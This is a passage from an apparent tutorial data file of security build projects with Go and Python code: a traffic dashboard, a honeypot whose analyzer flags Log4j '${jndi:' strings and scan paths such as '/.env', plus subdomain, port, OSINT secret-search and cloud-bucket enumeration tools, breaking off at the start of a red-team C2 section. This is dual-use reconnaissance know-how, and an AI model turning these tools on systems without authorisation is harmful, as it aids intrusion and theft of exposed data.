            features = json.loads(data[1])
            ml_features = self.extract_ml_features(features)
            X = self.scaler.transform([ml_features])

            prediction = self.model.predict(X)[0]
            score = self.model.score_samples(X)[0]

            if prediction == -1:  # Anomaly
                self.alert(features, score)

    def alert(self, features: dict, score: float):
        """Handle detected anomaly."""
        print(f"ANOMALY DETECTED!")
        print(f"  Source: {features['src_ip']}:{features['src_port']}")
        print(f"  Dest: {features['dst_ip']}:{features['dst_port']}")
        print(f"  Score: {score:.4f}")

        # Could trigger: webhook, block IP, log to SIEM, etc.

if __name__ == '__main__':
    detector = AnomalyDetector()
    detector.detect()
\`\`\`

### Detection Capabilities
- Port scans (high unique destination count)
- DDoS (high packet/byte rate)
- Data exfiltration (unusual outbound traffic)
- Beaconing (periodic C2 communication)`
				},
				{
					title: 'Build a Traffic Analyzer with Visualization Dashboard',
					description: 'Go for high-speed capture, Python for visualization with Plotly/Dash',
					details: `## Traffic Analyzer with Dashboard

### Architecture
\`\`\`
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Go Capture     │────▶│  TimescaleDB    │────▶│  Python Dash    │
│  (aggregate)    │     │  (time-series)  │     │  (visualization)│
└─────────────────┘     └─────────────────┘     └─────────────────┘
\`\`\`

### Go Traffic Aggregator

\`\`\`go
package main

import (
    "database/sql"
    "log"
    "sync"
    "time"

    _ "github.com/lib/pq"
    "github.com/google/gopacket"
    "github.com/google/gopacket/pcap"
)

type TrafficStats struct {
    Timestamp    time.Time
    SrcIP        string
    DstIP        string
    Protocol     string
    Port         int
    Packets      int64
    Bytes        int64
}

type Aggregator struct {
    stats map[string]*TrafficStats
    mu    sync.Mutex
    db    *sql.DB
}

func (a *Aggregator) aggregate(features *FlowFeatures) {
    key := fmt.Sprintf("%s-%s-%d",
        features.SrcIP,
        features.DstIP,
        features.DstPort)

    a.mu.Lock()
    defer a.mu.Unlock()

    if _, exists := a.stats[key]; !exists {
        a.stats[key] = &TrafficStats{
            Timestamp: time.Now().Truncate(time.Minute),
            SrcIP:     features.SrcIP,
            DstIP:     features.DstIP,
            Protocol:  features.Protocol,
            Port:      int(features.DstPort),
        }
    }

    a.stats[key].Packets++
    a.stats[key].Bytes += int64(features.PacketSize)
}

func (a *Aggregator) flush() {
    a.mu.Lock()
    stats := a.stats
    a.stats = make(map[string]*TrafficStats)
    a.mu.Unlock()

    tx, _ := a.db.Begin()
    stmt, _ := tx.Prepare(\`
        INSERT INTO traffic_stats
        (timestamp, src_ip, dst_ip, protocol, port, packets, bytes)
        VALUES ($1, $2, $3, $4, $5, $6, $7)
    \`)

    for _, s := range stats {
        stmt.Exec(s.Timestamp, s.SrcIP, s.DstIP,
            s.Protocol, s.Port, s.Packets, s.Bytes)
    }

    tx.Commit()
}

func main() {
    db, _ := sql.Open("postgres",
        "postgres://user:pass@localhost/traffic?sslmode=disable")

    agg := &Aggregator{
        stats: make(map[string]*TrafficStats),
        db:    db,
    }

    // Flush every minute
    go func() {
        for range time.Tick(time.Minute) {
            agg.flush()
        }
    }()

    // Capture and aggregate
    handle, _ := pcap.OpenLive("en0", 65536, true, pcap.BlockForever)
    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

    for packet := range packetSource.Packets() {
        features := extractFeatures(packet)
        agg.aggregate(features)
    }
}
\`\`\`

### Python Dash Dashboard

\`\`\`python
import dash
from dash import dcc, html
from dash.dependencies import Input, Output
import plotly.express as px
import plotly.graph_objects as go
import pandas as pd
import psycopg2
from datetime import datetime, timedelta

app = dash.Dash(__name__)

def get_db():
    return psycopg2.connect(
        "postgres://user:pass@localhost/traffic"
    )

app.layout = html.Div([
    html.H1("Network Traffic Dashboard"),

    dcc.Interval(id='interval', interval=60*1000),

    html.Div([
        html.Div([
            html.H3("Bandwidth Over Time"),
            dcc.Graph(id='bandwidth-chart')
        ], className='six columns'),

        html.Div([
            html.H3("Top Talkers"),
            dcc.Graph(id='top-talkers')
        ], className='six columns'),
    ], className='row'),

    html.Div([
        html.Div([
            html.H3("Protocol Distribution"),
            dcc.Graph(id='protocol-pie')
        ], className='six columns'),

        html.Div([
            html.H3("Top Destinations"),
            dcc.Graph(id='top-destinations')
        ], className='six columns'),
    ], className='row'),
])

@app.callback(
    Output('bandwidth-chart', 'figure'),
    Input('interval', 'n_intervals')
)
def update_bandwidth(n):
    conn = get_db()
    df = pd.read_sql('''
        SELECT
            time_bucket('1 minute', timestamp) as time,
            SUM(bytes) / 1024 / 1024 as mb
        FROM traffic_stats
        WHERE timestamp > NOW() - INTERVAL '1 hour'
        GROUP BY time
        ORDER BY time
    ''', conn)
    conn.close()

    fig = px.line(df, x='time', y='mb',
        title='Bandwidth (MB/min)')
    return fig

@app.callback(
    Output('top-talkers', 'figure'),
    Input('interval', 'n_intervals')
)
def update_top_talkers(n):
    conn = get_db()
    df = pd.read_sql('''
        SELECT src_ip, SUM(bytes) as bytes
        FROM traffic_stats
        WHERE timestamp > NOW() - INTERVAL '1 hour'
        GROUP BY src_ip
        ORDER BY bytes DESC
        LIMIT 10
    ''', conn)
    conn.close()

    fig = px.bar(df, x='src_ip', y='bytes',
        title='Top 10 Source IPs by Bytes')
    return fig

@app.callback(
    Output('protocol-pie', 'figure'),
    Input('interval', 'n_intervals')
)
def update_protocol_pie(n):
    conn = get_db()
    df = pd.read_sql('''
        SELECT protocol, SUM(packets) as packets
        FROM traffic_stats
        WHERE timestamp > NOW() - INTERVAL '1 hour'
        GROUP BY protocol
    ''', conn)
    conn.close()

    fig = px.pie(df, values='packets', names='protocol',
        title='Packets by Protocol')
    return fig

if __name__ == '__main__':
    app.run_server(debug=True, port=8050)
\`\`\`

### Database Schema (TimescaleDB)
\`\`\`sql
CREATE TABLE traffic_stats (
    timestamp TIMESTAMPTZ NOT NULL,
    src_ip INET,
    dst_ip INET,
    protocol TEXT,
    port INTEGER,
    packets BIGINT,
    bytes BIGINT
);

SELECT create_hypertable('traffic_stats', 'timestamp');

CREATE INDEX idx_traffic_src ON traffic_stats (src_ip, timestamp DESC);
CREATE INDEX idx_traffic_dst ON traffic_stats (dst_ip, timestamp DESC);
\`\`\``
				},
				{
					title: 'Build a Network Honeypot',
					description: 'Go for protocol emulation, Python for logging and analysis',
					details: `## Network Honeypot

### Architecture
\`\`\`
┌─────────────────────────────────────────────────────────┐
│                    Honeypot Server                       │
├─────────────┬─────────────┬─────────────┬──────────────┤
│  SSH (Go)   │  HTTP (Go)  │  FTP (Go)   │  SMB (Go)    │
│  Port 22    │  Port 80    │  Port 21    │  Port 445    │
└──────┬──────┴──────┬──────┴──────┬──────┴──────┬───────┘
       │             │             │             │
       └─────────────┴──────┬──────┴─────────────┘
                            ▼
                   ┌─────────────────┐
                   │  Event Queue    │
                   │  (Redis)        │
                   └────────┬────────┘
                            ▼
                   ┌─────────────────┐
                   │  Python Logger  │
                   │  & Analyzer     │
                   └────────┬────────┘
                            ▼
              ┌─────────────┴─────────────┐
              ▼                           ▼
     ┌─────────────────┐        ┌─────────────────┐
     │  Elasticsearch  │        │  Alert Webhook  │
     └─────────────────┘        └─────────────────┘
\`\`\`

### Go SSH Honeypot

\`\`\`go
package main

import (
    "encoding/json"
    "fmt"
    "log"
    "net"
    "time"

    "github.com/go-redis/redis/v8"
    "golang.org/x/crypto/ssh"
)

type SSHEvent struct {
    Timestamp   time.Time \`json:"timestamp"\`
    SourceIP    string    \`json:"source_ip"\`
    Username    string    \`json:"username"\`
    Password    string    \`json:"password"\`
    ClientVer   string    \`json:"client_version"\`
    SessionID   string    \`json:"session_id"\`
    EventType   string    \`json:"event_type"\`
}

func main() {
    rdb := redis.NewClient(&redis.Options{Addr: "localhost:6379"})

    // Generate or load host key
    privateKey, _ := generateHostKey()

    config := &ssh.ServerConfig{
        PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
            event := SSHEvent{
                Timestamp:  time.Now(),
                SourceIP:   c.RemoteAddr().String(),
                Username:   c.User(),
                Password:   string(pass),
                ClientVer:  string(c.ClientVersion()),
                SessionID:  fmt.Sprintf("%x", c.SessionID()),
                EventType:  "auth_attempt",
            }

            data, _ := json.Marshal(event)
            rdb.LPush(ctx, "honeypot_events", data)

            log.Printf("Auth attempt: %s / %s from %s",
                c.User(), string(pass), c.RemoteAddr())

            // Always reject but pretend to think about it
            time.Sleep(time.Duration(500+rand.Intn(1500)) * time.Millisecond)
            return nil, fmt.Errorf("invalid credentials")
        },
    }
    config.AddHostKey(privateKey)

    listener, _ := net.Listen("tcp", ":2222")
    log.Println("SSH honeypot listening on :2222")

    for {
        conn, err := listener.Accept()
        if err != nil {
            continue
        }
        go handleSSHConnection(conn, config, rdb)
    }
}

func handleSSHConnection(conn net.Conn, config *ssh.ServerConfig, rdb *redis.Client) {
    defer conn.Close()

    // Log connection
    event := SSHEvent{
        Timestamp: time.Now(),
        SourceIP:  conn.RemoteAddr().String(),
        EventType: "connection",
    }
    data, _ := json.Marshal(event)
    rdb.LPush(ctx, "honeypot_events", data)

    // Perform SSH handshake
    _, chans, reqs, err := ssh.NewServerConn(conn, config)
    if err != nil {
        return
    }

    go ssh.DiscardRequests(reqs)

    for newChannel := range chans {
        // Log channel requests
        event := SSHEvent{
            Timestamp: time.Now(),
            SourceIP:  conn.RemoteAddr().String(),
            EventType: "channel_" + newChannel.ChannelType(),
        }
        data, _ := json.Marshal(event)
        rdb.LPush(ctx, "honeypot_events", data)

        newChannel.Reject(ssh.UnknownChannelType, "not supported")
    }
}
\`\`\`

### Go HTTP Honeypot

\`\`\`go
func startHTTPHoneypot(rdb *redis.Client) {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        event := map[string]interface{}{
            "timestamp":   time.Now(),
            "source_ip":   r.RemoteAddr,
            "method":      r.Method,
            "path":        r.URL.Path,
            "user_agent":  r.UserAgent(),
            "headers":     r.Header,
            "event_type":  "http_request",
        }

        // Log POST data
        if r.Method == "POST" {
            body, _ := io.ReadAll(r.Body)
            event["body"] = string(body)
        }

        data, _ := json.Marshal(event)
        rdb.LPush(ctx, "honeypot_events", data)

        // Return fake vulnerable page
        w.Header().Set("Server", "Apache/2.2.15")
        fmt.Fprintf(w, "<html><body>Welcome to the server</body></html>")
    })

    http.ListenAndServe(":8080", nil)
}
\`\`\`

### Python Event Processor

\`\`\`python
import json
import redis
from elasticsearch import Elasticsearch
from datetime import datetime
import requests

class HoneypotAnalyzer:
    def __init__(self):
        self.redis = redis.Redis()
        self.es = Elasticsearch(['http://localhost:9200'])
        self.webhook_url = "https://hooks.slack.com/..."

        # Known attack patterns
        self.attack_patterns = {
            'ssh_brute': {'threshold': 10, 'window': 60},
            'web_scan': {'paths': ['/admin', '/wp-admin', '/.env']},
            'known_exploits': ['CVE-2021-44228', 'shellshock'],
        }

    def process_events(self):
        while True:
            data = self.redis.brpop('honeypot_events', timeout=1)
            if not data:
                continue

            event = json.loads(data[1])

            # Enrich event
            event = self.enrich(event)

            # Store in Elasticsearch
            self.es.index(
                index=f"honeypot-{datetime.now():%Y.%m}",
                document=event
            )

            # Check for interesting activity
            self.analyze(event)

    def enrich(self, event: dict) -> dict:
        """Add GeoIP, threat intel, etc."""
        ip = event.get('source_ip', '').split(':')[0]

        # GeoIP lookup (using free database)
        # event['geo'] = geoip.lookup(ip)

        # Check against threat intel
        # event['threat_score'] = threatintel.check(ip)

        return event

    def analyze(self, event: dict):
        """Detect interesting patterns."""
        event_type = event.get('event_type')

        if event_type == 'auth_attempt':
            # Check for brute force
            ip = event['source_ip']
            count = self.redis.incr(f'ssh_attempts:{ip}')
            self.redis.expire(f'ssh_attempts:{ip}', 60)

            if count >= 10:
                self.alert(f"SSH brute force from {ip}", event)

        elif event_type == 'http_request':
            path = event.get('path', '')

            # Check for known attack paths
            if any(p in path for p in self.attack_patterns['web_scan']['paths']):
                self.alert(f"Web scan detected: {path}", event)

            # Check for exploit attempts
            body = event.get('body', '')
            if '\${jndi:' in body:
                self.alert("Log4j exploit attempt!", event)

    def alert(self, message: str, event: dict):
        """Send alert to Slack/webhook."""
        payload = {
            'text': f":warning: {message}",
            'attachments': [{
                'fields': [
                    {'title': 'Source IP', 'value': event.get('source_ip')},
                    {'title': 'Time', 'value': event.get('timestamp')},
                ]
            }]
        }
        requests.post(self.webhook_url, json=payload)

if __name__ == '__main__':
    analyzer = HoneypotAnalyzer()
    analyzer.process_events()
\`\`\``
				}
			]
		},
		{
			name: 'Reconnaissance Tools',
			description: 'Build tools for information gathering and attack surface mapping',
			tasks: [
				{
					title: 'Build a Subdomain Enumerator',
					description: 'Fast concurrent DNS brute-forcing and scraping with Go',
					details: `## Subdomain Enumerator in Go

### Features
- Concurrent DNS resolution
- Multiple data sources (DNS brute-force, CT logs, web scraping)
- Wildcard detection
- Output in multiple formats

### Implementation

\`\`\`go
package main

import (
    "bufio"
    "context"
    "fmt"
    "net"
    "os"
    "sync"
    "time"
)

type Result struct {
    Subdomain string
    IPs       []string
    Source    string
}

type Enumerator struct {
    domain     string
    wordlist   []string
    results    map[string]*Result
    resultsMux sync.Mutex
    resolver   *net.Resolver
    workers    int
}

func NewEnumerator(domain string, workers int) *Enumerator {
    return &Enumerator{
        domain:   domain,
        results:  make(map[string]*Result),
        workers:  workers,
        resolver: &net.Resolver{
            PreferGo: true,
            Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
                d := net.Dialer{Timeout: 5 * time.Second}
                return d.DialContext(ctx, "udp", "8.8.8.8:53")
            },
        },
    }
}

func (e *Enumerator) LoadWordlist(path string) error {
    file, err := os.Open(path)
    if err != nil {
        return err
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        e.wordlist = append(e.wordlist, scanner.Text())
    }
    return scanner.Err()
}

func (e *Enumerator) checkWildcard() bool {
    // Check if domain has wildcard DNS
    random := fmt.Sprintf("random%d.%s", time.Now().UnixNano(), e.domain)
    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()

    ips, err := e.resolver.LookupHost(ctx, random)
    return err == nil && len(ips) > 0
}

func (e *Enumerator) resolve(subdomain string) *Result {
    fqdn := fmt.Sprintf("%s.%s", subdomain, e.domain)

    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()

    ips, err := e.resolver.LookupHost(ctx, fqdn)
    if err != nil {
        return nil
    }

    return &Result{
        Subdomain: fqdn,
        IPs:       ips,
        Source:    "bruteforce",
    }
}

func (e *Enumerator) BruteForce() {
    if e.checkWildcard() {
        fmt.Println("[!] Wildcard DNS detected, results may be unreliable")
    }

    jobs := make(chan string, e.workers)
    var wg sync.WaitGroup

    // Start workers
    for i := 0; i < e.workers; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for word := range jobs {
                result := e.resolve(word)
                if result != nil {
                    e.resultsMux.Lock()
                    e.results[result.Subdomain] = result
                    e.resultsMux.Unlock()
                    fmt.Printf("[+] %s -> %v\\n", result.Subdomain, result.IPs)
                }
            }
        }()
    }

    // Send jobs
    for _, word := range e.wordlist {
        jobs <- word
    }
    close(jobs)

    wg.Wait()
}

func main() {
    domain := os.Args[1]

    enum := NewEnumerator(domain, 50)
    enum.LoadWordlist("subdomains.txt")

    fmt.Printf("[*] Enumerating subdomains for %s\\n", domain)
    start := time.Now()

    enum.BruteForce()

    fmt.Printf("\\n[*] Found %d subdomains in %v\\n",
        len(enum.results), time.Since(start))
}
\`\`\`

### Certificate Transparency Source

\`\`\`go
func (e *Enumerator) QueryCTLogs() error {
    url := fmt.Sprintf("https://crt.sh/?q=%%25.%s&output=json", e.domain)

    resp, err := http.Get(url)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    var entries []struct {
        NameValue string \`json:"name_value"\`
    }

    if err := json.NewDecoder(resp.Body).Decode(&entries); err != nil {
        return err
    }

    for _, entry := range entries {
        // Parse multi-line entries (SANs)
        for _, name := range strings.Split(entry.NameValue, "\\n") {
            name = strings.TrimSpace(name)
            if strings.HasSuffix(name, e.domain) {
                e.resultsMux.Lock()
                if _, exists := e.results[name]; !exists {
                    e.results[name] = &Result{
                        Subdomain: name,
                        Source:    "crtsh",
                    }
                    fmt.Printf("[+] CT: %s\\n", name)
                }
                e.resultsMux.Unlock()
            }
        }
    }

    return nil
}
\`\`\`

### Common Wordlist Sources
- SecLists: \`/usr/share/seclists/Discovery/DNS/\`
- Assetnote: https://wordlists.assetnote.io/
- Custom from target (scrape JS files, wayback machine)

### Features to Add
1. **Recursive enumeration** - Find sub-subdomains
2. **Permutation** - word-word, word123, worddev
3. **Web scraping** - Parse HTML for subdomains
4. **API sources** - SecurityTrails, Shodan, VirusTotal`
				},
				{
					title: 'Build a Port Scanner with Service Fingerprinting',
					description: 'SYN/TCP connect scanning with banner grabbing and version detection',
					details: `## Advanced Port Scanner

### Features
- TCP Connect and SYN scanning
- Service version detection
- OS fingerprinting hints
- Rate limiting to avoid detection

### TCP Connect Scanner with Version Detection

\`\`\`go
package main

import (
    "bufio"
    "fmt"
    "net"
    "regexp"
    "strings"
    "sync"
    "time"
)

type ServiceProbe struct {
    Protocol string
    Send     []byte
    Match    *regexp.Regexp
    Service  string
}

var probes = []ServiceProbe{
    {
        Protocol: "tcp",
        Send:     nil, // Wait for banner
        Match:    regexp.MustCompile(\`^SSH-(\d+\.\d+)-(.+)\`),
        Service:  "ssh",
    },
    {
        Protocol: "tcp",
        Send:     []byte("GET / HTTP/1.0\\r\\n\\r\\n"),
        Match:    regexp.MustCompile(\`Server: (.+)\`),
        Service:  "http",
    },
    {
        Protocol: "tcp",
        Send:     nil,
        Match:    regexp.MustCompile(\`^220.*FTP\`),
        Service:  "ftp",
    },
    {
        Protocol: "tcp",
        Send:     nil,
        Match:    regexp.MustCompile(\`^220.*SMTP\`),
        Service:  "smtp",
    },
    {
        Protocol: "tcp",
        Send:     []byte("\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x01"),
        Match:    regexp.MustCompile(\`mysql|MariaDB\`),
        Service:  "mysql",
    },
}

type PortResult struct {
    Port       int
    State      string
    Service    string
    Version    string
    Banner     string
}

func fingerprint(host string, port int, timeout time.Duration) *PortResult {
    result := &PortResult{Port: port, State: "closed"}

    addr := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", addr, timeout)
    if err != nil {
        return result
    }
    defer conn.Close()

    result.State = "open"

    // Try each probe
    for _, probe := range probes {
        conn.SetDeadline(time.Now().Add(3 * time.Second))

        // Send probe data if any
        if probe.Send != nil {
            conn.Write(probe.Send)
        }

        // Read response
        reader := bufio.NewReader(conn)
        response, _ := reader.ReadString('\\n')

        // Check for multi-line
        for i := 0; i < 5; i++ {
            line, err := reader.ReadString('\\n')
            if err != nil {
                break
            }
            response += line
        }

        if probe.Match.MatchString(response) {
            result.Service = probe.Service
            matches := probe.Match.FindStringSubmatch(response)
            if len(matches) > 1 {
                result.Version = matches[1]
            }
            result.Banner = strings.TrimSpace(response)
            return result
        }
    }

    // No match, just return banner
    result.Banner = strings.TrimSpace(response)
    return result
}

func scanRange(host string, startPort, endPort, workers int) []*PortResult {
    var results []*PortResult
    var mu sync.Mutex
    var wg sync.WaitGroup

    ports := make(chan int, workers)

    for i := 0; i < workers; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for port := range ports {
                result := fingerprint(host, port, 3*time.Second)
                if result.State == "open" {
                    mu.Lock()
                    results = append(results, result)
                    mu.Unlock()

                    fmt.Printf("%d/tcp  open  %-10s %s\\n",
                        result.Port, result.Service, result.Version)
                }
            }
        }()
    }

    for port := startPort; port <= endPort; port++ {
        ports <- port
    }
    close(ports)

    wg.Wait()
    return results
}

func main() {
    host := "scanme.nmap.org"

    fmt.Printf("Scanning %s...\\n\\n", host)
    fmt.Println("PORT     STATE  SERVICE    VERSION")

    start := time.Now()
    results := scanRange(host, 1, 1024, 100)

    fmt.Printf("\\nScanned 1024 ports in %v\\n", time.Since(start))
    fmt.Printf("Found %d open ports\\n", len(results))
}
\`\`\`

### SYN Scanner (requires root/raw sockets)

\`\`\`go
// SYN scanning requires raw sockets
// Use gopacket for crafting packets

import (
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
)

func synScan(dstIP net.IP, port int) bool {
    // Create raw socket
    handle, _ := pcap.OpenLive("en0", 65535, true, pcap.BlockForever)
    defer handle.Close()

    // Build packet
    eth := &layers.Ethernet{
        SrcMAC:       srcMAC,
        DstMAC:       dstMAC,
        EthernetType: layers.EthernetTypeIPv4,
    }
    ip := &layers.IPv4{
        SrcIP:    srcIP,
        DstIP:    dstIP,
        Protocol: layers.IPProtocolTCP,
    }
    tcp := &layers.TCP{
        SrcPort: layers.TCPPort(rand.Intn(65535)),
        DstPort: layers.TCPPort(port),
        SYN:     true,
    }
    tcp.SetNetworkLayerForChecksum(ip)

    // Serialize and send
    buf := gopacket.NewSerializeBuffer()
    gopacket.SerializeLayers(buf, gopacket.SerializeOptions{},
        eth, ip, tcp)
    handle.WritePacketData(buf.Bytes())

    // Listen for SYN-ACK response
    // ...

    return receivedSynAck
}
\`\`\``
				},
				{
					title: 'Build an OSINT Data Aggregator',
					description: 'Python tool to aggregate data from public sources',
					details: `## OSINT Data Aggregator in Python

### Data Sources
- WHOIS records
- DNS records
- Social media
- Public databases
- Search engines
- Leaked credentials (haveibeenpwned API)

### Implementation

\`\`\`python
import asyncio
import aiohttp
import dns.resolver
import whois
from dataclasses import dataclass
from typing import List, Optional
import json

@dataclass
class OSINTResult:
    source: str
    data_type: str
    value: any
    confidence: float
    raw: Optional[dict] = None

class OSINTAggregator:
    def __init__(self):
        self.results: List[OSINTResult] = []
        self.session: Optional[aiohttp.ClientSession] = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, *args):
        await self.session.close()

    async def gather_all(self, target: str):
        """Run all OSINT modules concurrently."""
        tasks = [
            self.whois_lookup(target),
            self.dns_records(target),
            self.certificate_transparency(target),
            self.shodan_search(target),
            self.github_search(target),
        ]

        await asyncio.gather(*tasks, return_exceptions=True)
        return self.results

    async def whois_lookup(self, domain: str):
        """Get WHOIS registration data."""
        try:
            w = whois.whois(domain)

            self.results.append(OSINTResult(
                source="whois",
                data_type="registrar",
                value=w.registrar,
                confidence=1.0
            ))

            self.results.append(OSINTResult(
                source="whois",
                data_type="creation_date",
                value=str(w.creation_date),
                confidence=1.0
            ))

            if w.emails:
                for email in w.emails if isinstance(w.emails, list) else [w.emails]:
                    self.results.append(OSINTResult(
                        source="whois",
                        data_type="email",
                        value=email,
                        confidence=0.9
                    ))

        except Exception as e:
            print(f"WHOIS error: {e}")

    async def dns_records(self, domain: str):
        """Get all DNS records."""
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']

        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for rdata in answers:
                    self.results.append(OSINTResult(
                        source="dns",
                        data_type=f"dns_{rtype.lower()}",
                        value=str(rdata),
                        confidence=1.0
                    ))
            except:
                pass

    async def certificate_transparency(self, domain: str):
        """Query Certificate Transparency logs."""
        url = f"https://crt.sh/?q=%.{domain}&output=json"

        try:
            async with self.session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()

                    seen = set()
                    for entry in data:
                        name = entry.get('name_value', '')
                        for subdomain in name.split('\\n'):
                            subdomain = subdomain.strip()
                            if subdomain and subdomain not in seen:
                                seen.add(subdomain)
                                self.results.append(OSINTResult(
                                    source="crt.sh",
                                    data_type="subdomain",
                                    value=subdomain,
                                    confidence=0.95
                                ))
        except Exception as e:
            print(f"CT error: {e}")

    async def shodan_search(self, target: str):
        """Search Shodan for exposed services."""
        api_key = os.getenv('SHODAN_API_KEY')
        if not api_key:
            return

        url = f"https://api.shodan.io/shodan/host/{target}?key={api_key}"

        try:
            async with self.session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()

                    for port_data in data.get('data', []):
                        self.results.append(OSINTResult(
                            source="shodan",
                            data_type="open_port",
                            value={
                                'port': port_data.get('port'),
                                'service': port_data.get('product'),
                                'version': port_data.get('version'),
                            },
                            confidence=0.9,
                            raw=port_data
                        ))
        except:
            pass

    async def github_search(self, target: str):
        """Search GitHub for leaked secrets."""
        queries = [
            f'"{target}" password',
            f'"{target}" api_key',
            f'"{target}" secret',
        ]

        for query in queries:
            url = f"https://api.github.com/search/code?q={query}"
            headers = {'Accept': 'application/vnd.github.v3+json'}

            try:
                async with self.session.get(url, headers=headers) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        for item in data.get('items', [])[:5]:
                            self.results.append(OSINTResult(
                                source="github",
                                data_type="code_leak",
                                value={
                                    'repo': item['repository']['full_name'],
                                    'path': item['path'],
                                    'url': item['html_url'],
                                },
                                confidence=0.6
                            ))
            except:
                pass

async def main():
    target = "example.com"

    async with OSINTAggregator() as osint:
        results = await osint.gather_all(target)

        print(f"\\nOSINT Results for {target}")
        print("=" * 50)

        by_type = {}
        for r in results:
            by_type.setdefault(r.data_type, []).append(r)

        for dtype, items in sorted(by_type.items()):
            print(f"\\n{dtype.upper()}:")
            for item in items:
                print(f"  [{item.source}] {item.value}")

if __name__ == '__main__':
    asyncio.run(main())
\`\`\`

### Output Formats
- JSON for machine consumption
- Markdown report for humans
- Graph data for visualization (Neo4j)`
				},
				{
					title: 'Build a Cloud Asset Discovery Tool',
					description: 'Enumerate S3 buckets, Azure blobs, GCP resources',
					details: `## Cloud Asset Discovery in Go

### Targets
- AWS S3 buckets
- Azure Blob storage
- GCP Cloud Storage
- Misconfigured permissions

### S3 Bucket Enumeration

\`\`\`go
package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "sync"
    "time"
)

type BucketResult struct {
    Name       string
    Exists     bool
    Public     bool
    ListPublic bool
    Region     string
}

func checkS3Bucket(name string) *BucketResult {
    result := &BucketResult{Name: name}

    // Check if bucket exists
    url := fmt.Sprintf("https://%s.s3.amazonaws.com", name)

    client := &http.Client{
        Timeout: 10 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }

    resp, err := client.Head(url)
    if err != nil {
        return result
    }
    defer resp.Body.Close()

    switch resp.StatusCode {
    case 200:
        result.Exists = true
        result.Public = true
    case 403:
        result.Exists = true
        result.Public = false
    case 404:
        return result
    case 301:
        // Bucket exists in different region
        result.Exists = true
        result.Region = resp.Header.Get("x-amz-bucket-region")
    }

    // Check if listing is public
    if result.Exists {
        listResp, err := client.Get(url)
        if err == nil {
            defer listResp.Body.Close()
            if listResp.StatusCode == 200 {
                result.ListPublic = true
            }
        }
    }

    return result
}

func generatePermutations(base string) []string {
    suffixes := []string{
        "", "-dev", "-staging", "-prod", "-backup",
        "-data", "-files", "-assets", "-static",
        "-logs", "-db", "-database", "-archive",
    }

    prefixes := []string{
        "", "dev-", "staging-", "prod-", "test-",
    }

    var names []string
    for _, prefix := range prefixes {
        for _, suffix := range suffixes {
            names = append(names, prefix+base+suffix)
        }
    }
    return names
}

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: s3enum <company-name>")
        return
    }

    base := os.Args[1]
    names := generatePermutations(base)

    // Add wordlist if provided
    if len(os.Args) > 2 {
        file, _ := os.Open(os.Args[2])
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            names = append(names, scanner.Text())
        }
        file.Close()
    }

    fmt.Printf("Checking %d bucket names...\\n\\n", len(names))

    var wg sync.WaitGroup
    results := make(chan *BucketResult, len(names))

    // Worker pool
    sem := make(chan struct{}, 20)

    for _, name := range names {
        wg.Add(1)
        go func(n string) {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()

            result := checkS3Bucket(n)
            if result.Exists {
                results <- result
            }
        }(name)
    }

    go func() {
        wg.Wait()
        close(results)
    }()

    fmt.Println("BUCKET NAME                      PUBLIC  LISTABLE")
    fmt.Println("------------------------------------------------")

    for r := range results {
        public := "No"
        if r.Public {
            public = "Yes"
        }
        listable := "No"
        if r.ListPublic {
            listable = "YES!"
        }

        fmt.Printf("%-32s %-7s %s\\n", r.Name, public, listable)
    }
}
\`\`\`

### Azure Blob Enumeration

\`\`\`go
func checkAzureBlob(account, container string) *BucketResult {
    result := &BucketResult{Name: fmt.Sprintf("%s/%s", account, container)}

    url := fmt.Sprintf("https://%s.blob.core.windows.net/%s?restype=container&comp=list",
        account, container)

    resp, err := http.Get(url)
    if err != nil {
        return result
    }
    defer resp.Body.Close()

    if resp.StatusCode == 200 {
        result.Exists = true
        result.Public = true
        result.ListPublic = true
    } else if resp.StatusCode == 403 {
        result.Exists = true
    }

    return result
}
\`\`\`

### GCP Bucket Enumeration

\`\`\`go
func checkGCPBucket(name string) *BucketResult {
    result := &BucketResult{Name: name}

    url := fmt.Sprintf("https://storage.googleapis.com/%s", name)

    resp, err := http.Get(url)
    if err != nil {
        return result
    }
    defer resp.Body.Close()

    if resp.StatusCode == 200 {
        result.Exists = true
        result.Public = true
        result.ListPublic = true
    } else if resp.StatusCode == 403 {
        result.Exists = true
    }

    return result
}
\`\`\`

### Common Findings
- Backup files with credentials
- Database dumps
- Log files with PII
- Source code
- Configuration files`
				}
			]
		},
		{
			name: 'Command & Control (C2)',
			description: 'Build covert communication infrastructure for red team operations',
			tasks: [
				{
					title: 'Build a Basic C2 Server',
					description: 'Go-based listener management and agent handling',
					details: `## C2 Server Architecture

### Components
\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                       C2 Server (Go)                         │
├─────────────┬─────────────┬─────────────┬──────────────────┤
│  Listener   │   Agent     │   Task      │    Operator      │
│  Manager    │   Handler   │   Queue     │    API           │
└──────┬──────┴──────┬──────┴──────┬──────┴──────┬───────────┘
       │             │             │             │
       ▼             ▼             ▼             ▼
